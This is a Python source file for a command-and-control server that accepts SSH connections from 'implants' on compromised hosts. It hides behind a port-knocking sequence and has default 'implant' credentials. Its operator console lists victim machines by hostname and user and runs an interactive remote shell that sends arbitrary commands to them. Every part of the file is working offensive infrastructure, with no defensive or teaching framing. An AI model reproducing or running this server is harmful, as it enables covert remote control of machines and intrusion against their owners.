import paramiko
import os
import socket
import logging
import threading
import argparse
import json
from typing import Tuple, Optional, Dict, List, Callable
from server.port_knock import PortKnockHandler

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Server')
    

class ClientSession:
    """Represents a connected client session"""
    def __init__(self, channel, client_info: str, addr: Tuple[str, int]):
        self.channel = channel
        self.client_info = client_info
        self.addr = addr
        self.is_active = True
        self.hostname = None
        self.username = None
        self._parse_client_info()
    
    def _parse_client_info(self):
        """Parse the client info string to extract hostname and username"""
        try:
            if isinstance(self.client_info, str) and "Implant checked in from" in self.client_info:
                parts = self.client_info.split()
                self.hostname = parts[4]
                self.username = parts[6]
            elif isinstance(self.client_info, dict):
                # Handle the case where client_info is already a dict
                self.hostname = self.client_info.get('hostname', 'unknown')
                self.username = self.client_info.get('username', 'unknown')
                self.client_info = f"Implant checked in from {self.hostname} as {self.username}"
        except Exception:
            logger.warning(f"Couldn't parse client info: {self.client_info}")
            self.hostname = "unknown"
            self.username = "unknown"
    
    def __str__(self):
        return f"{self.username}@{self.hostname} ({self.addr[0]}:{self.addr[1]})"


class SSHServer(paramiko.ServerInterface):
    """SSH Server Interface implementation"""
    def __init__(self, config: dict):
        self.config = config
        
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        if (username == self.config['username'] and 
            password == self.config['password']):
            return paramiko.AUTH_SUCCESSFUL
        logger.warning(f"Authentication failed for user: {username}")
        return paramiko.AUTH_FAILED


class C2Server:
    """Main C2 Server class"""
    def __init__(self, config: dict):
        self.config = config
        self.server_socket = None
        self.host_key = None
        self.clients: Dict[str, ClientSession] = {}
        self.current_client_id = None
        
        # Callback for new clients (to be set by API)
        self.on_new_client: Optional[Callable[[ClientSession], None]] = None
        
        # Initialize port knocking
        knock_sequence = config.get('knock_sequence', [10000, 10001, 10002])
        if isinstance(knock_sequence, str):
            # Handle the case where knock_sequence is a comma-separated string (from env vars)
            knock_sequence = [int(port) for port in knock_sequence.split(',')]
        self.port_knock = PortKnockHandler(knock_sequence)

        self._load_host_key()
        
    def _load_host_key(self):
        """Load the SSH host key"""
        key_path = os.path.join(os.getcwd(), 'keys', self.config['host_key'])
        try:
            # Try to load existing key
            self.host_key = paramiko.RSAKey(filename=key_path)
            logger.info(f"Loaded host key from {key_path}")
        except Exception as e:
            logger.warning(f"Failed to load host key: {e}")
            logger.info("Generating new RSA host key")
            # Generate a new key
            self.host_key = paramiko.RSAKey.generate(2048)
            try:
                # Create directory if it doesn't exist
                os.makedirs(os.path.dirname(key_path), exist_ok=True)
                # Save the key
                self.host_key.write_private_key_file(key_path)
                logger.info(f"Saved new host key to {key_path}")
            except Exception as e:
                logger.error(f"Failed to save host key: {e}")
    
    def start(self):
        """Start the C2 server"""
        try:
            # Start port knock listeners
            self.port_knock.start_listeners(self.config['bind_address'])
            logger.info("Port knock listeners started")
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['bind_address'], self.config['port']))
            self.server_socket.listen(5)
            logger.info(f"Server listening on {self.config['bind_address']}:{self.config['port']}")
            
            while True:
                client_socket, addr = self.server_socket.accept()

                # Check if client completed port knocking
                if not self.port_knock.is_ip_allowed(addr[0]):
                    logger.warning(f"Rejected connection from {addr[0]}: Port knock sequence not completed")
                    client_socket.close()
                    continue

                threading.Thread(target=self._handle_connection, 
                                args=(client_socket, addr)).start()
                
        except KeyboardInterrupt:
            logger.info("Server shutdown requested")
        except Exception as e:
            logger.error(f"Server error: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            self.port_knock.stop_listeners()
            logger.info("Server stopped")
    
    def _handle_connection(self, client_socket, addr):
        """Handle a new client connection"""
        logger.info(f"New connection from {addr[0]}:{addr[1]}")
        
        try:
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.host_key)
            
            server_interface = SSHServer(self.config)
            transport.start_server(server=server_interface)
            
            channel = transport.accept(20)
            if channel is None:
                logger.error(f"No channel established from {addr[0]}:{addr[1]}")
                return
            
            # Receive client info
            client_info = channel.recv(1024).decode()
            logger.info(f"Client info: {client_info}")
            
            # Create a new client session
            client_id = channel.get_id()
            client = ClientSession(channel, client_info, addr)
            self.clients[client_id] = client
            
            # Send acknowledgment
            channel.send(' ')
            
            # If this is the first client, make it the current one
            if not self.current_client_id:
                self.current_client_id = client_id
                
            # Notify about new client
            print(f"\nNew client connected: {client}")
            print(f"{self._get_prompt()}", end="", flush=True)
            
            # Call the new client callback if set
            if self.on_new_client:
                self.on_new_client(client)
            
        except Exception as e:
            logger.error(f"Error handling connection: {e}")
            
    def _get_prompt(self):
        """Get the command prompt string"""
        if self.current_client_id and self.current_client_id in self.clients:
            client = self.clients[self.current_client_id]
            return f"c2({client.hostname})> "
        return "c2> "
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("No clients connected")
            return
            
        print("\nConnected clients:")
        print("-" * 60)
        print(f"{'ID':<4} {'Host':<15} {'User':<10} {'Address':<20}")
        print("-" * 60)
        
        for i, (client_id, client) in enumerate(self.clients.items()):
            if client.is_active:
                current = "*" if client_id == self.current_client_id else " "
                print(f"{current}{i:<3} {client.hostname:<15} {client.username:<10} {client.addr[0]}:{client.addr[1]}")
        print("-" * 60)

    def switch_client(self, client_index: int) -> bool:
        """Switch the current client by index"""
        if not self.clients:
            print("No clients connected")
            return False
            
        if client_index < 0 or client_index >= len(self.clients):
            print(f"Invalid client index: {client_index}")
            return False
            
        client_id = list(self.clients.keys())[client_index]
        self.current_client_id = client_id
        client = self.clients[client_id]
        print(f"Switched to {client}")
        return True
    
    def send_command(self, command: str) -> Optional[str]:
        """Send a command to the current client"""
        if not self.current_client_id:
            print("No client selected")
            return None
            
        if self.current_client_id not in self.clients:
            print("Selected client no longer connected")
            return None
            
        client = self.clients[self.current_client_id]
        try:
            client.channel.send(command)
            response = client.channel.recv(8192).decode()
            return response
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            # Mark client as inactive if we can't send commands
            client.is_active = False
            return None
    
    def command_loop(self):
        """Main command loop for the C2 server"""
        print("\nC2 Server Command Interface")
        print("Type 'help' for available commands")
        
        while True:
            try:
                cmd_line = input(self._get_prompt())
                if not cmd_line.strip():
                    continue
                    
                # Handle local commands
                if cmd_line.lower() == "exit":
                    print("Exiting command interface (server continues running)")
                    break
                    
                elif cmd_line.lower() == "help":
                    print("\nAvailable commands:")
                    print("  clients       - List all connected clients")
                    print("  use <id>      - Switch to a specific client")
                    print("  shell         - Enter interactive shell mode with current client")
                    print("  exit          - Exit the command interface")
                    print("  help          - Show this help message")
                    print("  <command>     - Send a command to the current client")
                    continue
                    
                elif cmd_line.lower() == "clients":
                    self.list_clients()
                    continue
                    
                elif cmd_line.lower().startswith("use "):
                    try:
                        client_index = int(cmd_line.split()[1])
                        self.switch_client(client_index)
                    except (IndexError, ValueError):
                        print("Usage: use <client_id>")
                    continue
                    
                elif cmd_line.lower() == "shell":
                    self.interactive_shell()
                    continue
                    
                # Send command to client
                response = self.send_command(cmd_line)
                if response:
                    print(response)
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
    
    def interactive_shell(self):
        """Enter an interactive shell with the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        print(f"\nEntering interactive shell with {client}")
        print("Type 'exit' to return to the C2 console\n")
        
        while True:
            try:
                cmd = input(f"{client.username}@{client.hostname}$ ")
                if cmd.lower() == "exit":
                    print("Returning to C2 console")
                    break
                    
                response = self.send_command(cmd)
                if response:
                    print(response, end="")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to return to the C2 console")
            except Exception as e:
                logger.error(f"Shell error: {e}")
                break


def load_config():
    """Load configuration from environment variables or config file"""
    # Try to load from config file first
    config_path = os.path.join(os.getcwd(), 'config', 'server_config.json')
    config = {}
    
    try:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
    except Exception as e:
        logger.warning(f"Failed to load config file: {e}")
    
    # Override with environment variables if present
    config['bind_address'] = os.getenv('C2_BIND_ADDRESS', config.get('bind_address', '0.0.0.0'))
    config['port'] = int(os.getenv('C2_PORT', config.get('port', 2222)))
    config['host_key'] = os.getenv('HOST_KEY', config.get('host_key', 'fren'))
    config['username'] = os.getenv('USERNAME', config.get('username', 'implant'))
    config['password'] = os.getenv('PASSWORD', config.get('password', 'implant'))
    
    # Parse knock sequence
    knock_seq = os.getenv('KNOCK_SEQUENCE', config.get('knock_sequence', [10000, 10001, 10002]))
    if isinstance(knock_seq, str):
        config['knock_sequence'] = [int(port) for port in knock_seq.split(',')]
    else:
        config['knock_sequence'] = knock_seq
    
    return config


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("--host", help="Bind address")
    parser.add_argument("--port", type=int, help="Listen port")
    parser.add_argument("--key", help="Host key file")
    parser.add_argument("--username", help="Auth username")
    parser.add_argument("--password", help="Auth password")
    return parser.parse_args()


def main():
    """Main entry point"""
    # Load config from file/env vars
    config = load_config()
    
    # Override with command line args if provided
    args = parse_arguments()
    if args.host:
        config['bind_address'] = args.host
    if args.port:
        config['port'] = args.port
    if args.key:
        config['host_key'] = args.key
    if args.username:
        config['username'] = args.username
    if args.password:
        config['password'] = args.password
    
    server = C2Server(config)
    
    # Start the server in a separate thread
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Start the command interface
    try:
        server.command_loop()
    except KeyboardInterrupt:
        print("\nServer shutting down")
    
    
if __name__ == '__main__':
    main()